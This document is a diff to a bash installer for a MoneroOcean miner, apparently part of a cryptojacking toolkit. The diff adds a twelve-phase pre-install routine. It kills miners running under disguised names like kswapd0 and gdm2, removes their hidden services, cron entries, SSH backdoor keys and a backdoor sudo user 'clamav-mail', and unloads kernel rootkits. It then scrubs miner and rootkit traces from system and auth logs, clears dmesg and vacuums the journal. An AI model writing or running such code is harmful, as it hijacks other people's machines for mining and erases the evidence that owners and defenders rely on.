@@ -1,10 +1,90 @@
 #!/bin/bash
 
-# ========================================================================
-# UNIVERSAL COMPATIBILITY LAYER
-# Auto-detects and fixes: systemd, SSL/TLS, curl/wget issues
-# ========================================================================
+# ==================== ULTIMATE CLEAN INSTALLATION ====================
+echo "========================================================================="
+echo "[*] ULTIMATE CLEAN INSTALL - Removing ALL previous traces"
+echo "========================================================================="
 
+# Phase 1: Kill all mining and related processes
+echo "[*] Phase 1: Terminating all mining processes..."
+pkill -9 -f "xmrig\|kswapd0\|swapd\|gdm2\|monero\|minerd\|cpuminer\|nicehash\|neptune"
+pkill -9 -f "\./swapd\|\./kswapd0\|\./xmrig"
+pkill -9 -f "config.json\|config_background.json"
+
+# Phase 2: Remove all miner files and directories
+echo "[*] Phase 2: Removing all miner files..."
+rm -rf ~/moneroocean ~/.moneroocean ~/.gdm* ~/.swapd ~/.system_cache
+rm -rf /tmp/xmrig* /tmp/.xmrig* /tmp/kworkerds /tmp/config.json
+rm -rf /var/tmp/.xm* /dev/shm/.xm* /usr/local/bin/minerd
+rm -rf /root/.swapd /root/.gdm* /root/.system_cache /root/.ssh/authorized_keys_backdoor
+
+# Phase 3: Clean systemd services
+echo "[*] Phase 3: Cleaning systemd services..."
+systemctl stop swapd gdm2 moneroocean_miner 2>/dev/null
+systemctl disable swapd gdm2 moneroocean_miner 2>/dev/null
+rm -f /etc/systemd/system/swapd.service /etc/systemd/system/gdm2.service /etc/systemd/system/moneroocean_miner.service 2>/dev/null
+systemctl daemon-reload 2>/dev/null
+
+# Phase 4: Clean SysV init scripts
+echo "[*] Phase 4: Cleaning SysV init scripts..."
+rm -f /etc/init.d/swapd /etc/init.d/gdm2 /etc/init.d/moneroocean_miner 2>/dev/null
+update-rc.d -f swapd remove 2>/dev/null
+update-rc.d -f gdm2 remove 2>/dev/null
+
+# Phase 5: Clean crontab
+echo "[*] Phase 5: Cleaning crontab..."
+crontab -l 2>/dev/null | grep -v "swapd\|gdm\|system_cache\|check_and_start\|system-watchdog" | crontab - 2>/dev/null
+
+# Phase 6: Clean user profiles
+echo "[*] Phase 6: Cleaning user profiles..."
+for user_file in ~/.profile ~/.bashrc ~/.bash_profile /root/.profile /root/.bashrc /root/.bash_profile; do
+    [ -f "$user_file" ] && sed -i '/\.swapd\|\.gdm\|\.system_cache\|moneroocean\|xmrig/d' "$user_file" 2>/dev/null
+done
+
+# Phase 7: Clean SSH backdoors
+echo "[*] Phase 7: Cleaning SSH backdoors..."
+for auth_file in ~/.ssh/authorized_keys /root/.ssh/authorized_keys; do
+    if [ -f "$auth_file" ]; then
+        sed -i '/AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukh\|AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/d' "$auth_file" 2>/dev/null
+    fi
+done
+
+# Phase 8: Remove backdoor user
+echo "[*] Phase 8: Removing backdoor user..."
+pkill -9 -u clamav-mail 2>/dev/null
+userdel -r clamav-mail 2>/dev/null
+rm -f /etc/sudoers.d/clamav-mail 2>/dev/null
+sed -i '/clamav-mail/d' /etc/passwd /etc/shadow 2>/dev/null
+
+# Phase 9: Remove kernel rootkits
+echo "[*] Phase 9: Removing kernel rootkits..."
+sudo rmmod diamorphine reptile rootkit nuk3gh0st 2>/dev/null
+rm -rf /reptile /tmp/.ICE-unix/Reptile /tmp/.ICE-unix/Diamorphine /tmp/.X11-unix/hiding-cryptominers-linux-rootkit 2>/dev/null
+rm -f /usr/local/lib/libhide.so /etc/ld.so.preload 2>/dev/null
+
+# Phase 10: Remove watchdog and cleanup scripts
+echo "[*] Phase 10: Removing watchdog..."
+rm -f /usr/local/bin/system-watchdog /usr/local/bin/clean-old-logs.sh 2>/dev/null
+
+# Phase 11: Clean logs
+echo "[*] Phase 11: Cleaning logs..."
+for logfile in /var/log/syslog /var/log/auth.log /var/log/messages /var/log/kern.log; do
+    [ -f "$logfile" ] && sed -i '/swapd\|gdm\|kswapd0\|xmrig\|miner\|accepted\|launcher\|diamorphine\|reptile\|rootkit\|Loaded\|>:-/d' "$logfile" 2>/dev/null
+done
+dmesg -C 2>/dev/null
+journalctl --vacuum-time=1s 2>/dev/null
+
+# Phase 12: Clean temporary files
+echo "[*] Phase 12: Cleaning temporary files..."
+find /tmp /var/tmp -name "*xmrig*" -o -name "*swapd*" -o -name "*gdm*" -o -name "*monero*" 2>/dev/null | xargs rm -rf 2>/dev/null
+
+echo "[✓] System fully cleaned from previous installations"
+echo "[*] Sleeping 3 seconds before fresh install..."
+sleep 3
+echo "========================================================================="
+# ======================================================================
+
+# Continue with original script...
 VERSION=3.2
 echo "========================================================================="
 echo "MoneroOcean FULL ULTIMATE Setup v$VERSION"
